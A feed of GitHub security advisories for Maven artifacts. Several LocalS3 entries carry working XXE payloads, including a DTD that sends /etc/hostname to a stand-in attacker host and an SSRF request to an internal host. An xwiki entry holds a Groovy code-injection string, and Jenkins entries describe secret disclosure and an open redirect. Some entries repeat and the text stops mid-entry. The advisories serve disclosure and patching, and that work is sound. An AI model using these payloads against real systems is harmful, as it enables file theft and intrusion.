<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2025-03-10T19:01:23.064Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 XML Parser Vulnerable to XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-47qw-ccjm-9c2c</id>
        <link href="https://github.com/advisories/GHSA-47qw-ccjm-9c2c"/>
        <updated>2025-03-10T18:29:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project, which implements an S3-compatible storage interface, contains a critical XML External Entity (XXE) Injection vulnerability in its XML parsing functionality. When processing XML requests for multipart upload operations, the application accepts and processes XML external entities, allowing an attacker to read local system files and potentially make outbound network connections.</p>
<p>The vulnerability exists because the XML parser is configured to process external entities and DTD (Document Type Definition) declarations without proper restrictions. This allows an attacker to define external entities that can read local files and exfiltrate their contents through outbound HTTP requests.</p>
<p>The vulnerability is particularly severe as it allows direct access to sensitive files on the filesystem, bypassing any directory traversal protections that might be in place for normal S3 operations.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create a malicious DTD file containing the following content:</li>
</ol>
<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.domain/?flag=%file;'&gt;"&gt;
%eval;
%exfil;
</code></pre>
<ol start="2">
<li><p>Host the malicious DTD file on an accessible web server</p>
</li>
<li><p>Initialize a multipart upload to the LocalS3 server:</p>
</li>
</ol>
<pre><code>curl -X PUT "http://app/test-bucket/test.txt?uploads"
</code></pre>
<ol start="4">
<li>Send a POST request to complete the multipart upload with the following XML payload:<pre><code>curl -X POST "http://app/test-bucket/test.txt?uploadId=[upload-id]" \
-H "Content-Type: application/xml" \
-d '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % dtd SYSTEM "http://attacker.domain/evil.dtd"&gt;
%dtd;
]&gt;
&lt;CompleteMultipartUpload&gt;
   &lt;Part&gt;
       &lt;PartNumber&gt;1&lt;/PartNumber&gt;
       &lt;ETag&gt;test&lt;/ETag&gt;
   &lt;/Part&gt;
&lt;/CompleteMultipartUpload&gt;'
</code></pre>
</li>
</ol>
<p>The server will process the XML, load the external DTD, and when evaluating the entities, will read the contents of /etc/hostname and send them to the attacker's server via an HTTP request.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable DTD processing in the XML parser configuration</li>
<li>If DTD processing is required, disable the ability to load external entities and external DTDs</li>
<li>Implement XML parsing with secure defaults using JAXP's XMLConstants.FEATURE_SECURE_PROCESSING feature</li>
<li>Set up proper input validation and sanitization for all XML processing operations</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An attacker can exploit this vulnerability to read arbitrary files from the server's filesystem and exfiltrate their contents through outbound HTTP requests. The vulnerability requires no authentication and can be exploited by anyone who can send requests to the LocalS3 server. This could lead to exposure of sensitive information including configuration files, credentials, and other confidential data stored on the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-47qw-ccjm-9c2c">https://github.com/Robothy/local-s3/security/advisories/GHSA-47qw-ccjm-9c2c</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-47qw-ccjm-9c2c">https://github.com/advisories/GHSA-47qw-ccjm-9c2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47qw-ccjm-9c2c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 Project Vulnerable to XML External Entity (XXE) Injection via Bucket Tagging API]]></title>
        <id>https://github.com/advisories/GHSA-v232-254c-m6p7</id>
        <link href="https://github.com/advisories/GHSA-v232-254c-m6p7"/>
        <updated>2025-03-10T18:29:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project, an S3-compatible storage service, is vulnerable to XML External Entity (XXE) injection through its bucket tagging API. The vulnerability exists because the application processes XML input without properly disabling external entity resolution.</p>
<p>When processing XML data for bucket tagging operations, the application allows the definition and resolution of external entities. This vulnerability allows an attacker to read arbitrary files from the server's filesystem by defining an external entity that references local files.</p>
<p>The vulnerability is particularly severe because it allows direct access to sensitive files on the server's filesystem, bypassing any intended access controls. The XXE vulnerability can be exploited to read any file that the application process has access to, potentially exposing sensitive configuration files, credentials, or other confidential information.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Create a bucket in the LocalS3 service using any S3 client (e.g., AWS CLI, boto3)</p>
</li>
<li><p>Send a PUT request to the bucket tagging endpoint with the following XML payload:</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY xxe SYSTEM "file:///flag.txt" &gt;
]&gt;
&lt;Tagging&gt;&lt;TagSet&gt;&lt;Tag&gt;&lt;Key&gt;xxe&lt;/Key&gt;&lt;Value&gt;&amp;xxe;&lt;/Value&gt;&lt;/Tag&gt;&lt;/TagSet&gt;&lt;/Tagging&gt;
</code></pre>
<pre><code>curl -X PUT \
     -H "Host: app" \
     -H "Authorization: AWS dummy:dummy" \
     -H "Content-Type: application/xml" \
     --data-binary @xxe.xml \
     http://app/bucket?tagging
</code></pre>
</li>
<li><p>Retrieve the bucket tags using a GET request to the same endpoint</p>
<pre><code>curl -H "Authorization: AWS dummy:dummy" http://app-1/bucket?tagging
</code></pre>
</li>
<li><p>The content of the targeted file will be returned in the tag value</p>
</li>
</ol>
<p>The successful exploitation of this vulnerability results in the contents of sensitive files being disclosed through the XML response, demonstrating the ability to read arbitrary files from the server's filesystem.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable XML external entity resolution in the XML parser configuration</li>
<li>Implement proper XML parsing security controls such as disabling DTD processing altogether</li>
<li>Use a safe parser configuration that doesn't process external entities or DTDs by default</li>
<li>Validate and sanitize all XML input before processing to prevent injection of malicious entities</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Critical severity vulnerability allowing unauthenticated attackers to read arbitrary files from the server's filesystem. This can lead to exposure of sensitive information, configuration files, and system data, potentially enabling further attacks against the system. The impact is heightened by the fact that the vulnerability requires minimal technical knowledge to exploit and can be triggered through standard S3 API operations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-v232-254c-m6p7">https://github.com/Robothy/local-s3/security/advisories/GHSA-v232-254c-m6p7</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-v232-254c-m6p7">https://github.com/advisories/GHSA-v232-254c-m6p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v232-254c-m6p7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 Project Bucket Operations Vulnerable to XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-2466-4485-4pxj</id>
        <link href="https://github.com/advisories/GHSA-2466-4485-4pxj"/>
        <updated>2025-03-10T18:29:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project contains an XML External Entity (XXE) Injection vulnerability in its bucket operations that process XML data. Specifically, the vulnerability exists in the bucket ACL and bucket tagging operations. The application processes XML input without properly disabling external entity resolution, allowing an attacker to read arbitrary files from the server's filesystem.</p>
<p>The vulnerability occurs because the XML parser used by the application processes DOCTYPE declarations and allows external entity references. When processing bucket ACL or tagging operations, the application includes the content of external entities in its response, effectively exposing sensitive files from the server.</p>
<p>This type of vulnerability can be exploited to read sensitive files, perform server-side request forgery (SSRF), or potentially achieve denial of service through various XXE attack vectors.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Create a test bucket using PUT request to http://[server]/[bucket-name]</p>
<pre><code>curl -X PUT "http://app/xxe-test-bucket2"```
</code></pre>
</li>
<li><p>Send a PUT request to http://[server]/[bucket-name]?acl with the following XXE payload:</p>
<pre><code>curl -X PUT "http://app/xxe-test-bucket2?acl" \
-H "Content-Type: application/xml" \
-d '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE AccessControlPolicy [
    &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt;
]&gt;
&lt;AccessControlPolicy&gt;
    &lt;Owner&gt;
        &lt;ID&gt;&amp;xxe;&lt;/ID&gt;
        &lt;DisplayName&gt;test&lt;/DisplayName&gt;
    &lt;/Owner&gt;
    &lt;AccessControlList&gt;
        &lt;Grant&gt;
            &lt;Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser"&gt;
                &lt;ID&gt;test&lt;/ID&gt;
                &lt;DisplayName&gt;test&lt;/DisplayName&gt;
            &lt;/Grantee&gt;
            &lt;Permission&gt;FULL_CONTROL&lt;/Permission&gt;
        &lt;/Grant&gt;
    &lt;/AccessControlList&gt;
&lt;/AccessControlPolicy&gt;'
</code></pre>
</li>
<li><p>Send a GET request to <code>http://[server]/[bucket-name]?acl</code> to retrieve the bucket ACL</p>
<pre><code>curl "http://app/xxe-test-bucket2?acl"
</code></pre>
</li>
</ol>
<p>After performing these steps, the content of the target file (/flag.txt in this case) will be included in the response within the ID field of the Owner element.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Configure the XML parser to disable external entity resolution by setting XMLConstants.FEATURE_SECURE_PROCESSING to true</li>
<li>Disable DOCTYPE declarations in the XML parser configuration</li>
<li>Implement XML input validation and sanitization before processing</li>
<li>Consider using JSON instead of XML for these operations if XML parsing is not strictly necessary</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability requires no authentication and can be exploited by any user who can make HTTP requests to the server. It allows reading arbitrary files from the server's filesystem, which could expose sensitive configuration files, credentials, or other confidential information. The vulnerability can also be used to perform SSRF attacks against internal systems.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-2466-4485-4pxj">https://github.com/Robothy/local-s3/security/advisories/GHSA-2466-4485-4pxj</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-2466-4485-4pxj">https://github.com/advisories/GHSA-2466-4485-4pxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2466-4485-4pxj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 CreateBucketConfiguration Endpoint XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-g6wm-2v64-wq36</id>
        <link href="https://github.com/advisories/GHSA-g6wm-2v64-wq36"/>
        <updated>2025-03-10T18:24:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 service's bucket creation endpoint is vulnerable to XML External Entity (XXE) injection. When processing the CreateBucketConfiguration XML document during bucket creation, the service's XML parser is configured to resolve external entities. This allows an attacker to declare an external entity that references an internal URL, which the server will then attempt to fetch when parsing the XML.</p>
<p>The vulnerability specifically occurs in the location constraint processing, where the XML parser resolves external entities without proper validation or restrictions. When the external entity is resolved, the server makes an HTTP request to the specified URL and includes the response content in the parsed XML document.</p>
<p>This vulnerability can be exploited to perform server-side request forgery (SSRF) attacks, allowing an attacker to make requests to internal services or resources that should not be accessible from external networks. The server will include the responses from these internal requests in the resulting bucket configuration, effectively leaking sensitive information.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create an XML document that includes an external entity declaration pointing to the internal target:</li>
</ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://internal-web/flag.txt"&gt; ]&gt;
&lt;CreateBucketConfiguration&gt;
    &lt;LocationConstraint&gt;&amp;xxe;&lt;/LocationConstraint&gt;
&lt;/CreateBucketConfiguration&gt;
</code></pre>
<ol start="2">
<li>Send a PUT request to create a new bucket with this configuration:</li>
</ol>
<pre><code class="language-bash">curl -X PUT http://app/test-bucket-2 -H 'Content-Type: application/xml' -d @payload.xml
</code></pre>
<ol start="3">
<li>Retrieve the bucket location to see the resolved entity content:</li>
</ol>
<pre><code class="language-bash">curl http://app/test-bucket-2/?location
</code></pre>
<p>When these steps are executed, the server processes the XML, resolves the external entity by making a request to the internal URL, and includes the response in the bucket's location constraint. The attacker can then retrieve this information through the bucket location endpoint.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable XML external entity resolution in the XML parser configuration. Most XML parsers have options to disable external entity processing.</li>
<li>Implement proper input validation for XML documents, rejecting those that contain DOCTYPE declarations or external entity references.</li>
<li>Use XML parsers that are configured securely by default and don't process external entities.</li>
<li>If external entity processing is required, implement a whitelist of allowed URLs and validate all URLs before making any requests.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability allows unauthenticated attackers to make the server perform HTTP requests to internal networks and services, potentially exposing sensitive information or enabling further attacks against internal systems. The attacker only needs to be able to send HTTP requests to the LocalS3 service to exploit this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-g6wm-2v64-wq36">https://github.com/Robothy/local-s3/security/advisories/GHSA-g6wm-2v64-wq36</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-g6wm-2v64-wq36">https://github.com/advisories/GHSA-g6wm-2v64-wq36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6wm-2v64-wq36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:24:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.xwiki.confluencepro:application-confluence-migrator-pro-ui] com.xwiki.confluencepro:application-confluence-migrator-pro-ui's application homepage is public]]></title>
        <id>https://github.com/advisories/GHSA-3w9f-2pph-j5vc</id>
        <link href="https://github.com/advisories/GHSA-3w9f-2pph-j5vc"/>
        <updated>2025-03-07T19:16:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The homepage of the application is public which enables a guest to download the package which might contain sensitive information.</p>
<h3 id="patches">Patches</h3>
<p>1.11.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>The access to the page can be manually restricted to a specific set of users or groups.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-3w9f-2pph-j5vc">https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-3w9f-2pph-j5vc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27604">https://nvd.nist.gov/vuln/detail/CVE-2025-27604</a></li>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/6ced42b1f341fd0ce6734fc58c7d694da5f365fb">https://github.com/xwikisas/application-confluence-migrator-pro/commit/6ced42b1f341fd0ce6734fc58c7d694da5f365fb</a></li>
<li><a href="https://github.com/advisories/GHSA-3w9f-2pph-j5vc">https://github.com/advisories/GHSA-3w9f-2pph-j5vc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3w9f-2pph-j5vc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T16:19:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.xwiki.confluencepro:application-confluence-migrator-pro-ui] com.xwiki.confluencepro:application-confluence-migrator-pro-ui Remote Code Execution via unescaped translations]]></title>
        <id>https://github.com/advisories/GHSA-6qvp-39mm-95v8</id>
        <link href="https://github.com/advisories/GHSA-6qvp-39mm-95v8"/>
        <updated>2025-03-07T19:16:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user that doesn't have programming rights can execute arbitrary code when creating a page using the Migration Page template.
A possible attack vector is the following:</p>
<ul>
<li>Create a page and add the following content:</li>
</ul>
<pre><code>confluencepro.job.question.advanced.input={{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}
</code></pre>
<ul>
<li>Use the object editor to add an object of type <code>XWiki.TranslationDocumentClass</code> with scope <code>USER</code>.</li>
<li>Access an unexisting page using the <code>MigrationTemplate</code></li>
</ul>
<pre><code>http://localhost:8080/xwiki/bin/edit/Page123?template=ConfluenceMigratorPro.Code.MigrationTemplate
</code></pre>
<p>It is expected that <code>{{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}</code> will be present on the page, however, <code>hello from groovy</code> will be printed.</p>
<h3 id="patches">Patches</h3>
<p>The issue will be fixed as part of v1.2. The fix was added with commit <a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d">35cef22</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds besides upgrading.</p>
<h3 id="references">References</h3>
<p>No references.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-6qvp-39mm-95v8">https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-6qvp-39mm-95v8</a></li>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d">https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27603">https://nvd.nist.gov/vuln/detail/CVE-2025-27603</a></li>
<li><a href="https://github.com/advisories/GHSA-6qvp-39mm-95v8">https://github.com/advisories/GHSA-6qvp-39mm-95v8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qvp-39mm-95v8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-07T16:07:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-p34j-r3ch-c985</id>
        <link href="https://github.com/advisories/GHSA-p34j-r3ch-c985"/>
        <updated>2025-03-06T22:30:09.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of agents via REST API or CLI.</p>
<p>This allows attackers with Agent/Extended Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in agent <code>config.xml</code> accessed via REST API or CLI for users lacking Agent/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27622">https://nvd.nist.gov/vuln/detail/CVE-2025-27622</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-p34j-r3ch-c985">https://github.com/advisories/GHSA-p34j-r3ch-c985</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p34j-r3ch-c985</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-p34j-r3ch-c985</id>
        <link href="https://github.com/advisories/GHSA-p34j-r3ch-c985"/>
        <updated>2025-03-06T22:30:09.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of agents via REST API or CLI.</p>
<p>This allows attackers with Agent/Extended Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in agent <code>config.xml</code> accessed via REST API or CLI for users lacking Agent/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27622">https://nvd.nist.gov/vuln/detail/CVE-2025-27622</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-p34j-r3ch-c985">https://github.com/advisories/GHSA-p34j-r3ch-c985</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p34j-r3ch-c985</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</id>
        <link href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf"/>
        <updated>2025-03-06T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of views via REST API or CLI.</p>
<p>This allows attackers with View/Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in view <code>config.xml</code> accessed via REST API or CLI for users lacking View/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27623">https://nvd.nist.gov/vuln/detail/CVE-2025-27623</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf">https://github.com/advisories/GHSA-rfh6-9r2q-98vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</id>
        <link href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf"/>
        <updated>2025-03-06T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of views via REST API or CLI.</p>
<p>This allows attackers with View/Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in view <code>config.xml</code> accessed via REST API or CLI for users lacking View/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27623">https://nvd.nist.gov/vuln/detail/CVE-2025-27623</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf">https://github.com/advisories/GHSA-rfh6-9r2q-98vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins Open Redirect vulnerability ]]></title>
        <id>https://github.com/advisories/GHSA-8hmv-92wm-39ch</id>
        <link href="https://github.com/advisories/GHSA-8hmv-92wm-39ch"/>
        <updated>2025-03-06T19:23:54.000Z</updated>
        <content type="html"><![CDATA[<p>Various features in Jenkins redirect users to partially user-controlled URLs inside Jenkins. To prevent open redirect vulnerabilities, Jenkins limits redirections to safe URLs (neither absolute nor scheme-relative/network-path reference).</p>
<p>In Jenkins 2.499 and earlier, LTS 2.492.1 and earlier, redirects starting with backslash (<code>\</code>) characters are considered safe.</p>
<p>This allows attackers to perform phishing attacks by having users go to a Jenkins URL that will forward them to a different site, because browsers interpret these characters as part of scheme-relative redirects.</p>
<p>Jenkins 2.500, LTS 2.492.2 considers redirects to URLs starting with backslash (<code>\</code>) characters to be unsafe, rejecting such redirects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27625">https://nvd.nist.gov/vuln/detail/CVE-2025-27625</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3501">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3501</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/4a9a3ecd08fc00d2f1c1125be789d8be24f02c9e">https://github.com/jenkinsci/jenkins/commit/4a9a3ecd08fc00d2f1c1125be789d8be24f02c9e</a></li>
<li><a href="https://github.com/advisories/GHSA-8hmv-92wm-39ch">https://github.com/advisories/GHSA-8hmv-92wm-39ch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hmv-92wm-39ch</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins Open Redirect vulnerability ]]></title>
        <id>https://github.com/advisories/GHSA-8hmv-92wm-39ch</id>
        <link href="https://github.com/advisories/GHSA-8hmv-92wm-39ch"/>
        <updated>2025-03-06T19:23:54.000Z</updated>
        <content type="html"><![CDATA[<p>Various features in Jenkins redirect users to partially user-controlled URLs inside Jenkins. To prevent open redirect vulnerabilities, Jenkins limits redirections to safe URLs (neither absolute nor scheme-relative/network-path reference).</p>
<p>In Jenkins 2.499 and earlier, LTS 2.492.1 and earlier, redirects starting with backslash (<code>\</code>) characters are considered safe.</p>
<p>This allows attackers to perform phishing attacks by having users go to a Jenkins URL that will forward them to a different site, because browsers interpret these characters as part of scheme-relative redirects.</p>
<p>Jenkins 2.500, LTS 2.492.2 considers redirects to URLs starting with backslash (<code>\</code>) characters to be unsafe, rejecting such redirects.</p>
<h3 id="references">References</h3>
<ul>
